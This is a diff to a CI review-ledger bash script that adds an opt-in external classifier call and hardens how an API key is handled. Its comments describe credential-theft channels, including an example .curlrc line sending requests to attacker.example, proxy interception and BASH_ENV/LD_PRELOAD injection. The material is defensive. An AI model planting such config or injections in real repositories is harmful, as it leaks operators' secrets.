@@ -158,6 +158,28 @@
 # resolver itself still needs the operator override (working-tree-path
 # substitution in the dispatcher COMPLETION block) — by design; the resolver
 # can only fix incidents that occur AFTER it lands.
+# The TypeSafe lane's key (see _noul_says_non_review) is UN-EXPORTED here,
+# before the first child this script forks (the git/grep of the self-resolver
+# just below). The value stays in this shell for the one curl that needs it,
+# which reads it from stdin; without this every jq/git/grep/awk the ledger forks
+# -- many resolved through a repo-injectable PATH -- would inherit it in its
+# environment, and a planted one could read it before delegating. The exec below
+# hands it on explicitly, so the re-exec'd copy still sees it.
+#
+# WHAT THIS DELIBERATELY DOES NOT COVER: code already running INSIDE this
+# process. A function imported through the environment (an exported `jq`), a
+# BASH_ENV file, or a DYLD_* injection executes in this shell and reads the key
+# as an ordinary variable; no un-export can help, and no reordering inside this
+# script can either. That is not a hole in the TypeSafe lane. It is the
+# ambient-session residual ADR 0026 (#475) accepts for every credentialed call on
+# the pr-grind path: the key lives in the operator's session environment, so a
+# repo able to inject code into that session reads it from ANY process it
+# reaches, not just this one. Closing it means keeping the key out of the
+# environment altogether — an operator configuration choice, not something a
+# script launched inside that environment can do. Treat further variants of this
+# class (BASH_FUNC_*, BASH_ENV, DYLD_*, LD_PRELOAD) as that residual, not as new
+# findings against this lane.
+export -n TYPESAFE_API_KEY
 if [ "${BUSDRIVER_DISABLE_ACK_SELF_RESOLVE:-0}" != "1" ] && \
    _self_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd -P) && \
    _git_root=$(git rev-parse --show-toplevel 2>/dev/null) && \
@@ -166,7 +188,10 @@ if [ "${BUSDRIVER_DISABLE_ACK_SELF_RESOLVE:-0}" != "1" ] && \
    [ -d "$_git_root/scripts" ] && \
    [ -f "$_git_root/scripts/ack-ledger.sh" ] && \
    ! [ "$_self_dir" -ef "$_git_root/scripts" ]; then
-  exec bash "$_git_root/scripts/ack-ledger.sh" "$@"
+  # /bin/bash, not `bash`: the inline assignment re-exports the key to this
+  # interpreter, so it must not resolve through the inherited (repo-injectable)
+  # PATH. /bin/bash is 3.2 on macOS; this script stays 3.2-compatible.
+  TYPESAFE_API_KEY="${TYPESAFE_API_KEY:-}" exec /bin/bash "$_git_root/scripts/ack-ledger.sh" "$@"
 fi
 unset _self_dir _git_root _remote
 
@@ -557,6 +582,258 @@ _STATUS_NONREVIEW_RE='^no review( was| is| were| has| had| have| been| being| be
 
 _STATUS_NONREVIEW_LEAD_RE='([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*(not|never)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)*[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*yet to( be)?[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*(unable|not able) to( be)?[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*failed to( be)?[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])'
 
+# ── TypeSafe / Jev union classifier (operator opt-in, OFF by default) ────────
+# WHY: the contract above says it outright — "A status description is free
+# English; a regex over it has no fixed point." #709 was a live fail-open, and
+# three of the follow-up fixes were implemented and then REVERTED because each
+# closed one grammatical form and opened its mirror image. This asks the SAME
+# question as one typed judgment (a Noul — the probability that the review
+# itself did not run) instead of as a grammar.
+#
+# UNION, NEVER REPLACEMENT. It is consulted at exactly ONE point: after all
+# three regex passes have already concluded "this is a real verdict" (the ack
+# default). It can therefore only ADD demotes, never lift one the regex found,
+# so the blocking set stays strictly >= the regex-only script's. Turning it on
+# creates no new bypass. The regex STAYS; retiring it is a separate decision
+# that needs more evidence than the current fixture set supports.
+#
+# FAILS CLOSED ONCE ENABLED: a transport error, a non-200, an unparseable body,
+# or a missing `curl` all return 2 (NO JUDGMENT), and the Tier E caller turns
+# that into `stale` — an errored matcher has not proven the status is a verdict
+# any more than an unreadable one has. It is deliberately NOT folded into the
+# demote (0): a demote maps to `none` for a bot that never approved, and `none`
+# is non-gating, so "demote on error" was a fail-closed claim the gate did not
+# honour. An over-block stalls a merge visibly and the operator can act;
+# under-blocking is the #709 fail-open itself. (The regex passes' own
+# `grep rc>=2 -> return 0` branches predate this lane and are unchanged.)
+# (`curl` is a NEW dependency for this script — jq was already hard-required,
+# curl was not — and it is reached only on the opted-in path, where its absence
+# blocks.)
+#
+# DISABLED IS TODAY'S BEHAVIOUR, NOT A DEMOTE. Off (the default) returns the
+# regex's own answer untouched and costs no network call. "Off" and "on but
+# broken" are deliberately DIFFERENT terminals: collapsing them would make every
+# un-opted-in repo start demoting the moment this function existed.
+#
+# CONSENT IS AUTHENTICATED BY LOCATION, never by a repo-writable value (ADR 0012
+# / #325): the enable switch is read ONLY from <home>/.claude/busdriver.json,
+# and <home> comes from the PASSWORD DATABASE, not $HOME. Reading $HOME was the
+# same defect one layer up from the .curlrc one below — a value the repo can
+# set, trusted as if it could not. A committed settings.json `env` block sets
+# HOME, so pointing it at the checkout made an in-repo .claude/busdriver.json
+# satisfy the one check whose entire purpose was to be unreachable from the
+# repo: the repo could turn its own lane on and start shipping its status text
+# to a third party. This script, unlike a hook, does not run behind
+# sanitized-gate.sh, so nothing else strips it. Same lookup and same pinned PATH
+# as skills/litmus/scripts/lib/iteration-history.sh. An unresolvable home leaves
+# consent unproven, so the lane stays OFF — which grants nothing.
+# The env var below is a KILL switch ONLY: it
+# can turn the lane OFF (restoring regex-only behaviour, which grants nothing),
+# and there is deliberately no env spelling that turns it ON.
+#
+# THE ENDPOINT IS PINNED HERE — AND THAT ALONE IS NOT ENOUGH, which the review
+# caught twice. Pinning the URL in this script says nothing about where curl
+# actually sends the request. A `.curlrc` reached through CURL_HOME was the
+# first channel (closed by -q below); `https_proxy` together with a repo-supplied
+# CURL_CA_BUNDLE/SSL_CERT_FILE is the second, and it discloses this
+# Authorization header to a TLS-intercepting proxy on a request that still looks
+# pinned from in here. Enumerating those variable names is the phrase-list
+# treadmill this whole file exists to escape, so the answer is an ALLOWLIST, not
+# a denylist: every curl below runs under `env -i PATH=... HOME=/nonexistent`
+# and sees nothing it was not explicitly handed.
+#
+# AND THE PATH IT IS HANDED IS PINNED — the third time the review caught this
+# class. `env -i PATH="$PATH"` stripped the proxy variables and then resolved
+# curl through the very PATH the repo can set, so a checkout-supplied `curl`
+# received the Authorization header with every flag above intact. `env` itself
+# is named absolutely for the same reason. What is deliberately NOT pinned: the
+# jq that builds the request body and parses the response, and the awk that
+# compares. None of them sees the key, and forging this lane's ack/demote answer
+# is something an injected PATH can already do to the entire ledger, whose
+# every tier runs through jq — pinning them here would add nothing that holds.
+# The consent read is different: a forged "enabled" is what STARTS the flow of
+# repo text to a third party, so that jq is pinned -- and launched through
+# `/usr/bin/env -i`, because a pinned PATH does not stop an IMPORTED shell
+# function named `jq` (bash resolves functions before PATH). env execs the
+# binary directly, so no function can answer for it. python3 for the home is
+# launched the same way. The key itself is un-exported at the top of this file
+# and handed to curl on stdin, so none of the unpinned tools sees it either.
+#
+# NOT routed through scripts/lib/resolve-cli.sh: this script is a standalone
+# `bash` subprocess with a documented env contract (see the header), and sourcing
+# a 1900-line resolver to read one boolean would put a merge-path dependency on
+# it for no gain.
+_TYPESAFE_URL='https://api.typesafe.ai/v1/systemone'
+_TYPESAFE_MAX_TIME=8
+# The ONLY path the lane resolves anything it trusts through. PATH is exactly as
+# repo-injectable as HOME (the same committed settings.json `env` block sets
+# it), so every tool that decides consent or touches the key — python3 for the
+# home, jq for the consent read, env and curl for the request — is found here
+# and never on the inherited PATH. Assigned unconditionally, so an exported
+# _TYPESAFE_PATH in the environment is overwritten, not honoured. Same list as
+# skills/litmus/scripts/lib/iteration-history.sh.
+_TYPESAFE_PATH="/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/homebrew/bin"
+_TYPESAFE_HOME=""
+_TYPESAFE_HOME_RESOLVED=0
+_TYPESAFE_THRESHOLD=""
+
+# Resolves the operator's home from the password database INTO _TYPESAFE_HOME,
+# and returns 1 when it cannot be resolved — which leaves consent unproven and
+# the lane off. It ASSIGNS rather than prints so the caller need not run it in a
+# command substitution: the memo below lives in the running shell, and a subshell
+# discards it, forking python3 once per bot status instead of once per process.
+# Do not "simplify" this back into something that prints.
+_typesafe_home() {
+  if [[ "$_TYPESAFE_HOME_RESOLVED" != "1" ]]; then
+    _TYPESAFE_HOME_RESOLVED=1
+    # env -i: the fixed candidate list in _TYPESAFE_PATH and nothing inherited.
+    # No usable interpreter there -> env fails -> empty home -> lane OFF.
+    _TYPESAFE_HOME=$(/usr/bin/env -i PATH="$_TYPESAFE_PATH" python3 -I -c \
+      'import os, pwd; print(pwd.getpwuid(os.getuid()).pw_dir)' 2>/dev/null) \
+      || _TYPESAFE_HOME=""
+  fi
+  [[ -n "$_TYPESAFE_HOME" ]] || return 1
+}
+
+# Sets _TYPESAFE_THRESHOLD and returns 0 when the lane is ON; returns 1 when
+# OFF. It assigns rather than prints for the same reason _typesafe_home does —
+# a caller wrapping it in a command substitution would throw the home memo away.
+#
+# ORDER MATTERS. The two env checks come FIRST because they cost nothing and are
+# exactly what an un-opted-in repo hits. Putting the password-DB lookup ahead of
+# them made every repo fork python3 once per bot status to answer a question the
+# very next line discards.
+_typesafe_optin() {
+  [[ "${ACK_LEDGER_TYPESAFE:-1}" != "0" ]] || return 1
+  [[ -n "${TYPESAFE_API_KEY:-}" ]] || return 1
+  _typesafe_home || return 1
+  [[ -f "$_TYPESAFE_HOME/.claude/busdriver.json" ]] || return 1
+  # A threshold outside (0,1] is rejected rather than clamped: a bad value means
+  # the operator's intent is unknown, and the lane declines instead of guessing.
+  #
+  # 0.8 is MEASURED, not picked. scripts/typesafe-ack-eval.sh replays the 133
+  # fixtures tests/test-ack-ledger-status-description.sh already pins, grouped by
+  # what the regex alone does with them, and scores each on jev-1.13.0. 87 of
+  # them the regex already demotes, and the union cannot double-demote those. 46
+  # are acked: 43 that must KEEP acking, plus the 3 documented under-block
+  # residuals that should demote. The highest score among the 43 is 0.77 ("The
+  # reviewer started, failed to complete"); the lowest among the 3 is 0.86. 0.8
+  # sits in that band and is the lowest threshold that closes all three residuals
+  # at zero cost to the 43. Measured cost of going lower: 1 false demote at 0.7
+  # and at 0.6, 2 at 0.5. Higher is worse, not safer — 0.9 sits on top of the
+  # residuals' own scores and closes only 1 of the 3.
+  #
+  # Re-run the eval before changing it, and take the numbers from ITS table: an
+  # earlier revision of this paragraph carried a fixture count and an ack count
+  # that had never been measured (137 and 127, against an actual 133 and 43), and
+  # priced 0.7 at four false demotes when the current question scores it at one.
+  #
+  # Slurped, and exactly ONE document required: jq streams a multi-document file,
+  # so an enabled object followed by an explicit `enabled:false` would still
+  # emit the first one's threshold. A file that is not a single JSON value is
+  # invalid config, and invalid config leaves the lane OFF.
+  _TYPESAFE_THRESHOLD=$(/usr/bin/env -i PATH="$_TYPESAFE_PATH" jq -ers '
+    select(length == 1) | .[0]
+    | select(.typesafe.ack_ledger.enabled == true)
+    | (.typesafe.ack_ledger.threshold | if . == null then 0.8 else . end)
+    | select(type == "number" and . > 0 and . <= 1)
+  ' "$_TYPESAFE_HOME/.claude/busdriver.json" 2>/dev/null)
+}
+
+# 0 = the judgment says this status reports a review that did not run (demote).
+# 1 = it does not — or the lane is off, in which case the regex's ack stands.
+# 2 = the lane is ON but produced no judgment (transport error, non-200,
+#     malformed body, unevaluable comparison). Kept DISTINCT from 0 because a
+#     demote is not a block: Tier E maps a demote to `none` for a bot that never
+#     approved, and `none` is non-gating, so folding errors into 0 made the
+#     fail-closed terminal non-gating. The Tier E caller turns 2 into `stale`.
+_noul_says_non_review() {
+  local body resp noul model='jev-1.13.0'
+  _typesafe_optin || return 1   # lane OFF (or home unknown) -> today's behaviour
+  # The RAW description, not the contraction-normalized `desc`: that
+  # normalization exists to serve the regex's spelled-out alternatives, and
+  # handing a judgment "can not" where the bot wrote "can't" only removes signal.
+  # A CONCRETE model id, never the `jev-latest` alias: the 0.8 threshold was
+  # measured on jev-1.13.0, and an alias that moves would silently swap the score
+  # distribution under a fixed threshold. To adopt a newer model, re-run
+  # scripts/typesafe-ack-eval.sh (it resolves the alias) and bump this id and
+  # the threshold TOGETHER.
+  body=$(jq -nc --arg d "$1" --arg m "$model" '{
+    state: { status_description: $d },
+    model: $m,
+    questions: {
+      review_did_not_run: {
+        type: "noul",
+        instructions: "Does this CI status description report that the code review itself did not actually run to completion?",
+        criteria: {
+          true: "The review was skipped, rate-limited, cancelled, timed out, or never started or finished",
+          false: "The review ran to completion, or the failure named belongs to something other than the review itself — a preview build, generated files, a profile update, the review summary, the reviewer, the author of the review, a reply, or a tool whose name merely contains the word review"
+        }
+      }
+    }
+  }') || return 2
+  # The contract says NON-200 fails closed, so the status is read and compared —
+  # `--fail` alone does not implement it. Plain `curl -sS` exits 0 on any HTTP
+  # status, and `--fail` only covers >= 400: a 3xx carrying a valid low-noul body
+  # still exits 0 with that body on stdout, and the ack would stand. `--fail` is
+  # kept as the fast path for 4xx/5xx; `%{http_code}` is the actual check.
+  # The code is appended on its own LAST line, so a body containing newlines
+  # cannot displace it.
+  # `-q` FIRST, and it is load-bearing, not tidiness. Pinning the URL in this
+  # script does not pin curl's DESTINATIONS: curl reads a `.curlrc` by default,
+  # `CURL_HOME=.` points that at the checkout, and a committed `.curlrc` holding
+  # `url = "https://attacker.example/collect"` adds a second request — carrying
+  # this Authorization header and this body. Every check below happens after
+  # that, so none of them can undo it. `-q` disables config-file reading
+  # entirely and must be the first argument. `--proto '=https'` refuses any
+  # scheme a config could otherwise introduce.
+  # `-H @-`: the Authorization header is read from STDIN (a here-string, no
+  # forked or function-shadowable printf), never from argv -- argv is readable
+  # by any local user through ps or /proc.
+  resp=$(/usr/bin/env -i PATH="$_TYPESAFE_PATH" HOME=/nonexistent \
+    curl -q -sS --proto '=https' --fail --max-time "$_TYPESAFE_MAX_TIME" -X POST "$_TYPESAFE_URL" \
+    -H @- \
+    -H 'Content-Type: application/json' \
+    -w '\n%{http_code}' \
+    --data-binary "$body" 2>/dev/null <<<"Authorization: Bearer $TYPESAFE_API_KEY") || return 2
+  [[ "${resp##*$'\n'}" == "200" ]] || return 2
+  resp="${resp%$'\n'*}"
+  # RANGE-checked, not merely type-checked: a probability outside [0,1] is a
+  # malformed judgment, and `select(type == "number")` alone accepted -1 and 5.
+  # Both compare FALSE against any threshold in (0,1], so an unchecked negative
+  # would have silently preserved the ack — a fail-OPEN on exactly the malformed
+  # input this branch exists to catch. Out of range now fails the select, jq -er
+  # exits non-zero, and the failure returns 2 (no judgment).
+  # --slurp, and EXACTLY ONE document. Without it jq happily streams a
+  # concatenation: a body of `{}` followed by a valid low-noul object passes,
+  # because the select discards the first document and emits the second — an
+  # answer the caller never sent one request for. Two VALID documents were worse
+  # still: jq emitted two newline-separated numbers, the awk comparison below
+  # errored on them, and the error fell through to the ack. Both are fail-OPENs
+  # on an enabled lane. `length != 1 -> empty` makes jq -er exit non-zero, which
+  # returns 2 like every other malformed response.
+  # `select(.model == $m)`: the request pins the model, and the RESPONSE must
+  # confirm it served that model. A server-side fallback (or a deprecated id
+  # quietly re-routed) would otherwise have its score judged against a threshold
+  # calibrated on jev-1.13.0. A missing or different `.model` fails the select
+  # and returns 2, the same check scripts/typesafe-ack-eval.sh applies.
+  noul=$(printf '%s' "$resp" \
+    | jq -er --slurp --arg m "$model" 'if length != 1 then empty else .[0] end
+                      | select(.model == $m)
+                      | .answers.review_did_not_run.noul
+                      | select(type == "number" and . >= 0 and . <= 1)' 2>/dev/null) || return 2
+  # awk, not bash arithmetic: both operands are floats. Its exit status is read
+  # as THREE outcomes, not two — `awk … && return 0; return 1` treated "awk could
+  # not evaluate this" as "below threshold", i.e. as an ack. An unevaluable
+  # comparison has not shown the status is a verdict, so it returns 2.
+  awk -v n="$noul" -v t="$_TYPESAFE_THRESHOLD" 'BEGIN { exit !(n >= t) }'
+  case $? in
+    0) return 0 ;;  # at or above threshold -> demote
+    1) return 1 ;;  # below threshold       -> the regex ack stands
+    *) return 2 ;;  # awk could not decide  -> error (fail-closed: caller blocks)
+  esac
+}
+
 _status_desc_is_non_review() {
   local rc desc clauses
   [[ -n "$1" ]] || return 1
@@ -665,7 +942,10 @@ _status_desc_is_non_review() {
   # branches, e.g. `| *—| *–`); this pass's bracket class was the one holdout.
   printf '%s' "$desc" | grep -qiE "^(the |a |an |this |that |code |pr )?review(( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)|(( [a-z]+ly)?( start(ed|ing)?| complet(e|ed|ing)| finish(ed|ing)?| running| queued| pending| in progress)( [a-z]+ly)?))* *(-|:|,|—|–) *($_STATUS_NONREVIEW_LEAD_RE)"; rc=$?
   [[ "$rc" -eq 0 ]] && return 0
-  [[ "$rc" -eq 1 ]] && return 1
+  # Every regex pass says "real verdict". That is the ack default — and the side
+  # the #709 fail-open lives on — so it is the ONLY point the union classifier is
+  # consulted. With the lane off (the default) this returns 1 exactly as before.
+  [[ "$rc" -eq 1 ]] && { _noul_says_non_review "$1"; return $?; }
   return 0
 }
 
@@ -767,6 +1047,16 @@ _unprovable_rate_limit_notice() {
 # bot — the guard failed OPEN in precisely the case where the caller's state is most
 # obviously broken. Observed live during #361's grind: a 0-byte env file zeroed every
 # source, and a genuine Tier-B HEAD-ack was reported as `none` (non-gating).
+# Sourcing this file loads the helpers above and stops HERE, before any of the
+# ledger's own work. It exists for exactly one reason: the operator home is
+# resolved from the password database, so no test can hand this script a fake
+# home from outside the process — which is the security property, not an
+# obstacle to route around. The union classifier's tests therefore source this
+# file and override `_typesafe_home` in-process. Pair it with
+# BUSDRIVER_DISABLE_ACK_SELF_RESOLVE=1 so the self-resolve block near the top
+# cannot exec over the sourcing shell.
+[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
+
 if [[ "${FETCH_OK:-0}" != "1" ]]; then echo "stale"; exit 0; fi
 
 # (A) Source 2: are there unresolved+non-outdated threads from this bot?
@@ -1422,14 +1712,24 @@ if [[ -n "$status_context" && -n "$ALL_STATUSES" ]]; then
       #     #294 failure), otherwise -> `stale` (a bot that reviewed an earlier
       #     commit and was then capacity-stopped on HEAD has NOT reviewed HEAD, so
       #     its earlier findings must keep blocking).
-      if _status_desc_is_non_review "$status_desc"; then
+      # rc 2 = the opted-in TypeSafe lane produced no judgment. It is NOT a
+      # demote: a demote reaches `none` below when ever_approved==0, which would
+      # make the lane's fail-closed terminal non-gating. An unjudged status has
+      # not been shown to be a verdict, so it blocks regardless of history.
+      # Captured in an `||` context, not `cmd; rc=$?`: an inherited errexit
+      # (exported SHELLOPTS) would otherwise exit on the ordinary rc 1 verdict
+      # before the capture runs, and the caller would read that as `stale`.
+      _sd_rc=0; _status_desc_is_non_review "$status_desc" || _sd_rc=$?
+      if [[ "$_sd_rc" -eq 0 ]]; then
         if [[ "$ever_approved" -eq 0 ]]; then
           : # fall through -> Case 1b downgrade block emits `none`
         else
           echo "stale"; exit 0
         fi
-      else
+      elif [[ "$_sd_rc" -eq 1 ]]; then
         emit_head_ack "${HEAD_SHA:0:8}" E; exit 0
+      else
+        echo "stale"; exit 0
       fi
     else
       echo "stale"; exit 0
